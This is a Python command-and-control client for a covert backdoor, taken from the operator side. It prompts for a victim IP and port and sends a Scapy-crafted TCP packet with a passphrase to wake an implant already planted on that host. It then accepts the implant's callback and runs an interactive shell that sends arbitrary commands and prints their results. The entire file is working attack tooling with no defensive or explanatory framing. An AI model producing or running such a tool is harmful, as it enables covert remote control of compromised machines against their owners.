#!/usr/bin/env python3
import sys
import socket
import logging
logging.getLogger("scapy.runtime").setLevel(logging.ERROR)
from scapy.all import *


prompt = ""
username = ""
sep = ""

gLHost = "" # local IP
gRHost = "" # victim IP
gLPort = -1 # local port number
gRPort = -1 # requested victim port number


gLHost = input("[?] Local Host IP : ")
gLPort = int(input("[?] Local Port Number : "))
gRHost = input("[?] Backdoor Host IP : ")
gRPort = int(input("[?] Request Backdoor Port : "))


def Request(lHost, lPort, rHost, rPort):
	global prompt
	global username
	global sep
	nbattempts = 3 # Let give it 3 attempts. If all fail just give up
	while nbattempts > 0:
		skt = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
		skt.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1) # Reuse a socket even if it has been recently closed and is timing.
		skt.settimeout(3) # Wait up to 3 sec on blocking method
		skt.bind((lHost, lPort)) # open the socket
		skt.listen(1) # only 1 connection accepted at the same time
		# Emit a scapy TCP packet containing the appropriate passphrase in order to wake up the backdoor
		send(IP(src=lHost, dst=rHost)/TCP(sport=lPort, dport=rPort, flags="A")/Raw(load="passphrase1"), verbose=0) 
		try:
			conn, sender = skt.accept() # accept a incoming connection
			addr = sender[0]
			port = sender[1]
			if addr == rHost or port == rPort: # check if the source is what we expect : The dest of a scapy packet
				break
			else : # sth connected but it's not our backdoor
				skt.close()
				nbattempts -= 1
				print("[!] Warning : Received unauthorized connection request... Connection refused")
		except socket.timeout: # accept() timed out
			skt.close()
			nbattempts -= 1
			print("[-] Failure : No answer... retrying")
	
	try:
		if nbattempts == 0: # 0 attempt left so failed to establish the connection with the backdoor 
			# maybe because there is no backdoor on the given host 
			# or the backdoor couldn't open the requested remote port
			# or a proxy firewall the wakeup packets 
			# or too many unwanted connection on the given local port... that would be quite worring...
			raise socket.timeout() 
		conn.sendall(b"passphrase2")
		passphrase = conn.recv(1024)
		while True:
			if type(passphrase) == bytes:
				passphrase = passphrase.decode("utf-8")
			if passphrase == "passphrase3":
				conn.sendall(b"Report")
				user=conn.recv(1024)
				if type(user) == bytes:
					user = user.decode("utf-8")
				conn.sendall(b"Location")
				location = conn.recv(1024)
				if type(location) == bytes:
					location = location.decode("utf-8")	
				username = user[:len(user)-1]
				sep = user[len(user)-1]
				prompt = username+location+prompt
				print("[+] Success : connected")
				return skt, conn
			else:
				skt.close()
				conn.close()
				return None, None
	except socket.timeout:
		skt.close()
		print("[-] Failure : No answer from the backdoor")
		return None, None
	except (KeyboardInterrupt, SystemExit):
		skt.close()
		print("[-] Failure : User keyboard interruption")
		return None, None


def SendCommand(conn, command):
	conn.sendall(str.encode(command))
	res = conn.recv(65535) 
	if type(res) == bytes:
		res = res.decode("utf-8")
	return res
	
def ConnectBackdoor(lHost, lPort, rHost, rPort):
	global prompt, username, sep
	skt, conn = Request(lHost, lPort, rHost, rPort)
	if skt != None and conn != None:
		try:
			while True:
				command = input(prompt+" ")
				if command != "":
					output = SendCommand(conn, command)
					if command.split()[0] == "cd":
						if len(output.split()) == 1:
							prompt = username+output+sep
						else:
							print(output)
					elif output.lower() == "exited":
						print("Success : Backdoor closed")
						break
					elif output.lower() == "released":
						print("Success : Backdoor removed")
						break
					else:
						if output.lower() != "daemonnoreport": # message sent by the backdoor when the command return no result to avoid troublesome packet padding
							print(output)
				else:
					continue
		except (KeyboardInterrupt, SystemExit):
			output = SendCommand(conn, "exit") # Send automatic exit command on error to prevent the backdoor being locked
			if output.lower() == "exited":
				print("Success : Done")
		except Exception as err:
			print(err.args)
			print("[-] Error : Something went wrong :'(") # Send automatic exit command on error to prevent the backdoor being locked
			output = SendCommand(conn, "exit")
			if output.lower() == "exited":
				print("Success : Backdoor closed")
		finally:
			conn.close()
			skt.close()
			

ConnectBackdoor(gLHost, gLPort, gRHost, gRPort)
